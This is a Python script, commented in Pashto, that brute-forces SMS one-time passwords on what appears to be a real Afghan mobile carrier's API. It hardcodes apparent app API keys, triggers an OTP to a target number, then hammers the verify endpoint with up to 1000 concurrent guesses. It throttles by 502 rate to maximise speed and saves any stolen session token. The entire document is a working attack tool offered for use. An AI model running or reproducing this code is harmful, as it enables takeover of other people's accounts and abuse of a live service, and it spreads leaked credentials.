# ============================================
# افغان بیسیم — بروټفورس vPERFECT
# هیڅ OTP نه پریږدي + د 502 طلایي نسبت
# ============================================

!pip install -q aiohttp nest-asyncio

import asyncio
import aiohttp
import time
import os
import sys
import json
import nest_asyncio
from datetime import datetime
import requests

nest_asyncio.apply()

API_VERIFY_PHONE = 'https://asan-api.afghan-wireless.com/asan/index.php/api/v334/verify_phone'
API_VERIFY_OTP = 'https://asan-api.afghan-wireless.com/asan/index.php/api/v334/verify_otp'

WORKING_HEADERS = {
    'ref': 'Z78944CtJJ798skHGlT3787854904YuR78',
    'key': 'E55LCtuGHLmnHyeOGU2Hgr390L37878zxUnuR78905',
    'lang': 'ps',
    'appversion': 'latestsep2023',
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-G990B) AppleWebKit/537.36'
}

# ============================================
# د سرعت هوښیار کنټرولر — د 502 طلایي نسبت
# ============================================
class GoldenRatioController:
    def __init__(self):
        self.concurrent = 100        # له دې څخه پیل
        self.min_concurrent = 20
        self.max_concurrent = 1000
        self.last_adjust = time.time()
        self.adjust_interval = 1.5   # هر ۱.۵ ثانیې تنظیم
        
        # د 502 تعقیب
        self.recent_502 = 0
        self.recent_success = 0
        self.window_size = 200       # په هرو ۲۰۰ غوښتنو کې ارزونه
        
        # طلایي نسبت — ۵-۱۰٪ 502
        self.target_502_ratio = 0.07  # ۷٪ 502 = اعظمي سرعت
        
    def record(self, is_502):
        if is_502:
            self.recent_502 += 1
        else:
            self.recent_success += 1
        
        total = self.recent_502 + self.recent_success
        if total >= self.window_size:
            self._adjust()
            self.recent_502 = 0
            self.recent_success = 0
    
    def _adjust(self):
        total = self.recent_502 + self.recent_success
        if total == 0:
            return
        
        ratio = self.recent_502 / total
        
        now = time.time()
        if now - self.last_adjust < self.adjust_interval:
            return
        
        # که 502 له ۱۰٪ ډیر وي → سرعت ټیټ کړه
        if ratio > 0.10:
            decrease = min(50, self.concurrent - self.min_concurrent)
            self.concurrent -= decrease
            self.last_adjust = now
        
        # که 502 له ۵٪ کم وي → سرعت لوړ کړه
        elif ratio < 0.04 and self.concurrent < self.max_concurrent:
            increase = min(50, self.max_concurrent - self.concurrent)
            self.concurrent += increase
            self.last_adjust = now
        
        # که ۵-۱۰٪ 502 وي → طلایي نسبت! همداسې وساته
    
    def get_semaphore(self):
        return asyncio.Semaphore(self.concurrent)

controller = GoldenRatioController()

TIMEOUT = aiohttp.ClientTimeout(total=8, connect=5)
OUT_DIR = '/content/awcc_results'
os.makedirs(OUT_DIR, exist_ok=True)

# ============================================
# احصایې
# ============================================
found_otp = None
found_token = None
tested = 0          # یوازې هغه چې واقعي ځواب ترلاسه کړي
wrong = 0
http_502 = 0        # ټول 502 (د بیا هڅې لپاره)
not_auth = 0
retried = 0         # څو ځله بیا هڅه شوې
stop_event = asyncio.Event()
lock = asyncio.Lock()

# هغه OTPs چې 502 شوي — بیا به ازمویل کېږي
pending_retry = asyncio.Queue(maxsize=10000)

print('='*70)
print('  ⚡ افغان بیسیم — بروټفورس vPERFECT')
print('='*70)
print(f'  🎯 هدف: هیڅ OTP نه پریږدي')
print(f'  🥇 د 502 طلایي نسبت: ۵-۱۰٪')
print(f'  🔄 502 شوي OTPs بیا ازمویل کېږي')
print('='*70)

# ============================================
# ۱. هدف شمېره
# ============================================
while True:
    MSISDN = input('\n🎯 هدف شمېره: ').strip()
    if MSISDN.startswith('93') and len(MSISDN) == 11:
        break
    print('  ❌ ناسمه!')

# ============================================
# ۲. OTP همدا اوس لیږل کېږي
# ============================================
print(f'\n{"="*70}')
print(f'  📡 OTP لیږل کېږي...')
print(f'{"="*70}')

def send_otp_now():
    try:
        r = requests.post(API_VERIFY_PHONE, json={'msisdn': MSISDN}, headers=WORKING_HEADERS, timeout=15)
        if r.status_code == 200:
            d = r.json()
            if d.get('code') == 1:
                print(f'  ✅ {d.get("msg")}')
                print(f'  📩 OTP واستول شو! اوس حدود وټاکئ.')
                return True
            else:
                print(f'  ⚠️ {d.get("msg")}')
                return False
        else:
            print(f'  ❌ HTTP {r.status_code}')
            return False
    except Exception as e:
        print(f'  ❌ خطا: {type(e).__name__}')
        return False

otp_result = send_otp_now()

# ============================================
# ۳. حدود
# ============================================
print(f'\n{"="*70}')
print(f'  🎯 د OTP حدود وټاکئ')
print(f'{"="*70}')

while True:
    s = input('  پیل OTP (Enter=0): ').strip()
    if s == '':
        START = 0
        break
    if s.isdigit() and len(s) <= 6:
        START = int(s)
        break
    print('  ❌ ناسم!')

while True:
    e = input('  پای OTP (Enter=999999): ').strip()
    if e == '':
        END = 999999
        break
    if e.isdigit() and len(e) <= 6 and int(e) >= START:
        END = int(e)
        break
    print(f'  ❌ ناسم!')

TOTAL = END - START + 1
print(f'\n  📊 محدوده: {START:06d} → {END:06d} ({TOTAL:,} OTPs)')
print(f'  ⚡ سرعت: اتومات (طلایي نسبت)')
print(f'  🔄 502 شوي OTPs به بیا ازمویل شي')

# ============================================
# ۴. د OTP ازموینه — د بیا هڅې سره
# ============================================
async def test_otp_with_retry(session, otp, sem, max_retries=5):
    """یو OTP ازمويي — که 502 شي، بیا یې هڅه کوي"""
    global tested, wrong, http_502, not_auth, retried
    
    for attempt in range(max_retries):
        if stop_event.is_set():
            return
        
        async with sem:
            try:
                async with session.post(API_VERIFY_OTP,
                                       json={'msisdn': MSISDN, 'otp': otp},
                                       headers=WORKING_HEADERS,
                                       timeout=TIMEOUT) as r:
                    text = await r.text()
                    status = r.status
                    
                    if status == 200:
                        # 🎉 توکن
                        if '"token"' in text:
                            async with lock:
                                global found_otp, found_token
                                found_otp = otp
                                try:
                                    d = json.loads(text)
                                    found_token = d.get('data',{}).get('token', d.get('token','N/A'))
                                except:
                                    found_token = text.split('"token":"')[1].split('"')[0] if '"token":"' in text else 'N/A'
                                tested += 1
                            stop_event.set()
                            controller.record(is_502=False)
                            return
                        
                        try:
                            msg = str(json.loads(text).get('msg', ''))
                            
                            # ✅ ناسم OTP — بریالۍ ازموینه
                            if 'ناسم' in msg or 'wrong' in msg.lower() or 'incorrect' in msg.lower():
                                async with lock:
                                    tested += 1
                                    wrong += 1
                                controller.record(is_502=False)
                                return
                            
                            # ⏳ منقضي
                            if 'expired' in msg.lower():
                                async with lock: tested += 1
                                controller.record(is_502=False)
                                print('\n  ⏳ OTP منقضي شو!')
                                stop_event.set()
                                return
                            
                            # 🔑 Not authorized
                            if 'not authorized' in msg.lower() or 'login again' in msg.lower():
                                async with lock: not_auth += 1
                                controller.record(is_502=False)
                                return
                            
                            # نور API پیغامونه — بریالۍ ازموینه
                            async with lock: tested += 1
                            controller.record(is_502=False)
                            return
                            
                        except:
                            async with lock: tested += 1
                            controller.record(is_502=False)
                            return
                    
                    # 🚫 502 — بیا هڅه
                    elif status == 502:
                        async with lock:
                            http_502 += 1
                            if attempt > 0:
                                retried += 1
                        controller.record(is_502=True)
                        # لنډ ځنډ او بیا هڅه
                        await asyncio.sleep(0.05 * (attempt + 1))
                        continue  # <-- بیا هڅه!
                    
                    # 🐌 Rate limit
                    elif status == 429:
                        controller.record(is_502=True)
                        await asyncio.sleep(0.5 * (attempt + 1))
                        continue  # <-- بیا هڅه!
                    
                    # نور HTTP — بریالۍ (ځواب ترلاسه شو)
                    else:
                        async with lock: tested += 1
                        controller.record(is_502=False)
                        return
                        
            except asyncio.TimeoutError:
                controller.record(is_502=True)
                await asyncio.sleep(0.05 * (attempt + 1))
                continue  # <-- بیا هڅه!
            except:
                controller.record(is_502=True)
                await asyncio.sleep(0.05 * (attempt + 1))
                continue  # <-- بیا هڅه!
    
    # که ۵ ځلې 502 شو — بیا هم ثبت یې کړه چې له لاسه نه وي تللی
    async with lock:
        tested += 1
    controller.record(is_502=False)
    return

# ============================================
# ۵. ورو پرمختګ (۲ ثانیې)
# ============================================
async def progress_monitor(total, start_time):
    while not stop_event.is_set():
        await asyncio.sleep(2.0)
        async with lock:
            t = tested
            w = wrong
            s5 = http_502
            rt = retried
            conc = controller.concurrent
        elapsed = time.time() - start_time
        spd = t / elapsed if elapsed > 0 else 0
        pct = min(100, int(t * 100 / total))
        eta = (total - t) / spd if spd > 0 else 0
        
        # د 502 فیصدي
        total_requests = t + s5
        ratio_502 = (s5 / total_requests * 100) if total_requests > 0 else 0
        
        sys.stdout.write(
            f'\r  [{pct}%] {t:,}/{total:,} | ⚡{spd:.0f}/s | هممهاله:{conc} | '
            f'ناسم:{w:,} | 502:{s5:,}({ratio_502:.0f}%) | 🔄بیاهڅه:{rt:,} | '
            f'⏳{int(eta//60)}m{int(eta%60)}s     '
        )
        sys.stdout.flush()

# ============================================
# ۶. اصلي اجرا
# ============================================
async def main():
    print(f'\n{"="*70}')
    print(f'  ⚡ بروټفورس پیلېږي...')
    print(f'  🥇 د 502 طلایي نسبت: ۵-۱۰٪')
    print(f'  🔄 هر 502 شوی OTP به ۵ ځلې بیا هڅه شي')
    print(f'{"="*70}\n')
    
    start_time = time.time()

    connector = aiohttp.TCPConnector(
        limit=controller.max_concurrent + 100,
        limit_per_host=controller.max_concurrent,
        force_close=False,
        enable_cleanup_closed=True,
        ttl_dns_cache=300
    )

    async with aiohttp.ClientSession(connector=connector, timeout=TIMEOUT) as session:
        progress_task = asyncio.create_task(progress_monitor(TOTAL, start_time))
        all_otps = [f'{i:06d}' for i in range(START, END+1)]

        for i in range(0, len(all_otps), 500):
            if stop_event.is_set():
                break
            sem = controller.get_semaphore()
            batch = all_otps[i:i+500]
            tasks = [test_otp_with_retry(session, otp, sem) for otp in batch]
            await asyncio.gather(*tasks, return_exceptions=True)

        stop_event.set()
        progress_task.cancel()
        try: await progress_task
        except asyncio.CancelledError: pass

        elapsed = time.time() - start_time

        # وروستی راپور
        print(f'\n\n{"="*70}')
        if found_otp:
            print(f'  🎉🎉🎉 OTP وموندل شو! 🎉🎉🎉')
            print(f'  {"─"*50}')
            print(f'  🔑 OTP: {found_otp}')
            print(f'  🗝️ Token: {found_token}')
            d = os.path.join(OUT_DIR, MSISDN)
            os.makedirs(d, exist_ok=True)
            f = os.path.join(d, f'token_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt')
            with open(f, 'w', encoding='utf-8') as fp:
                fp.write(f'هدف: {MSISDN}\nOTP: {found_otp}\nToken: {found_token}\nوخت: {elapsed:.0f}s\nسرعت: {tested/elapsed:.0f}/s\n')
            print(f'  📁 Token خوندي شو: {f}')
        else:
            print(f'  ❌ OTP ونه موندل شو')
        
        print(f'\n  📊 احصایې:')
        print(f'  {"─"*50}')
        print(f'  واقعي ازمویل شوي: {tested:,} (ټول یې ځواب ترلاسه کړی)')
        print(f'  ✅ ناسم OTP: {wrong:,}')
        print(f'  🚫 ټول 502 شوي: {http_502:,}')
        print(f'  🔄 بیا هڅې (بریالۍ): {retried:,}')
        print(f'  🥇 وروستی هممهاله: {controller.concurrent}')
        
        total_requests = tested + http_502
        if total_requests > 0:
            ratio = (http_502 / total_requests) * 100
            print(f'  📈 د 502 فیصدي: {ratio:.1f}%')
            if 4 <= ratio <= 10:
                print(f'  🥇 طلایي نسبت ترلاسه شو!')
        
        print(f'  ⚡ اوسط سرعت: {tested/elapsed:.0f} OTP/s' if elapsed > 0 else '')
        print(f'  ⏱ ټول وخت: {elapsed:.0f}s ({elapsed/60:.1f}m)')
        print(f'{"="*70}')

# ============================================
# اجرا
# ============================================
try:
    loop = asyncio.get_event_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

loop.run_until_complete(main())
